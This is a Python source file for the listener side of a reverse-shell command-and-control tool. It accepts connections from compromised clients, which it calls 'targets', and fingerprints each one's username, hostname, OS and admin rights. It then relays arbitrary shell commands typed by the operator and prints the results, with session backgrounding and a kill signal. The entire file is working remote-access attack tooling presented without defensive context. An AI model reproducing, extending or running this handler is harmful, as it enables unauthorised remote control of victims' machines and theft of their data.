import socket
import threading
import time
from datetime import datetime

class Server:
    def __init__(self):
        self.is_listening = False
        self.current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host_ip = ""
        self.host_port = 0
        self.list_of_targets = []

    def prepare_socket_thread(self, input_ip, input_port):
        self.current_socket.bind((input_ip, int(input_port)))
        print("")
        print("[+] Awaiting connection from client...\n")
        self.current_socket.listen()
        t1 = threading.Thread(target=self.welcome_new_connection)
        t1.start()

    def welcome_new_connection(self):
        while True:
            try:
                new_target = Target()
                new_target.get_all_infos(self)
                self.list_of_targets.append(new_target)
                print(f"\n[+] Connection recieved from {new_target.ip}.")
                print(f"    \___ time of connection : {new_target.time_record}")
                print(f"    \___ port used on the client : {new_target.port}\n\n(listening) Enter_command#> ", end="")
            except Exception:
                if self.is_listening:
                    self.current_socket.close()
                break
    
    def handle_single_target_communication(self, target_index):
        target = self.list_of_targets[target_index]
        while True:
            try:
                message = input(f"{target.user}@{target.ip}#> ")
                # void command
                if message == "":
                    pass
                # background command  
                if message == "bg":
                    print("\n[+] Moving current session to the background.\n")
                    break 
                # exit command
                if message == "exit":
                    self.send_message(target.id, message)
                    print("\n[-] sending kill signal...")
                    target.id.close()
                    del self.list_of_targets[target_index]
                    print("[-] Connection closed.\n")
                    break     
                # commands to be sent to client
                else :      
                    self.send_message(target.id, message)
                    response = self.recieve_message(target.id)
                    if response == "exit":
                        print("[-] The client has terminated the session.")
                        target.id.close()
                        del self.list_of_targets[target_index]
                        break
                    print(response)
            except KeyboardInterrupt:
                print("\n\nKeyboard interrupt issued.\n")
                self.send_message(target.id, "exit")
                print("\n[-] sending kill signal...")
                target.id.close()
                del self.list_of_targets[target_index]
                print("[-] Connection closed.\n")
                break
            except Exception:
                self.current_socket.close()
                break

    def reset(self):
        self.current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def send_message(self, target_id, message):
        message = str(message)
        target_id.send(message.encode())
    
    def recieve_message(self, target_id) :
        response = target_id.recv(4096).decode(errors="replace")
        return response

    def close_all_connections(self):
        print("\n[-] Closing...\n")
        for target in self.list_of_targets:
            self.send_message(target.id, "exit")
        self.list_of_targets = []
        self.current_socket.close()
    

class Target:
    def __init__(self):
        self.id = ""
        self.ip = ""
        self.port = 0
        self.time_record = ""
        self.hostname = ""
        self.user = ""
        self.fullname = ""
        self.status = "Placeholder"
        self.is_admin = False
        self.os = ""

    def get_username(self, server):
        server.send_message(self.id, "whoami")
        user_id = server.recieve_message(self.id).rstrip("\n")
        if len(user_id.split()) > 5:
            print(f"[-] Warning : couldn't resolve user id for {self.ip}.\n")
            user_id = "[unresolved]"
        self.user = user_id

    def get_time_record(self):
        hour_of_connection = time.strftime("%H:%M:%S", time.localtime())
        date_of_connection = datetime.now()
        self.time_record = (f"{date_of_connection.day}/{date_of_connection.month}/{date_of_connection.year} {hour_of_connection}")

    def get_admin_infos(self, server):
        admin_message = server.recieve_message(self.id)
        if (admin_message.split()[0] == "Linux") and (admin_message.split()[1] == "0"):
            self.is_admin = True
        elif admin_message == "1":
            self.is_admin = True

    def get_host_and_full_names(self):
        try:
            self.hostname = socket.gethostbyaddr(self.ip)[0]
        except Exception:
            print(f"\n[-] Couldn't resolve hostname for client {self.ip}.")
            self.hostname = "[unresolved]"
        if self.hostname is not None:
            self.fullname = self.hostname + "@" + self.ip

    def get_os(self, server):
        self.os = server.recieve_message(self.id)

    def get_all_infos(self, server):
        self.id, ip_and_port = server.current_socket.accept()
        self.ip = ip_and_port[0]
        self.port = ip_and_port[1]
        self.get_time_record()
        self.get_host_and_full_names()
        self.get_admin_infos(server)
        self.get_os(server)
        self.get_username(server)